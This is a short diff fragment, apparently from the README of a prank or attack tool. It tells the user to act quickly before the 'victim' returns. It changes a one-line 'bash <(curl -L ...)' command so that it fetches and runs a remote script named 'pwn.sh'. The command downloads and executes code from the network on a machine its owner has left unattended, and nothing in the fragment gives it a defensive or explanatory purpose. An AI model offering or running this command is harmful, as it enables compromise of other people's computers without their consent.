@@ -12,7 +12,7 @@ You are in a panic state, your victim can come from one moment to another and yo
 
 ### With DNS :
 ```
-bash <(curl -L croissant.do.umontp.fr) 
+bash <(curl -L do.yubu.app/pwn.sh) 
 ```
 ### Without DNS :
 
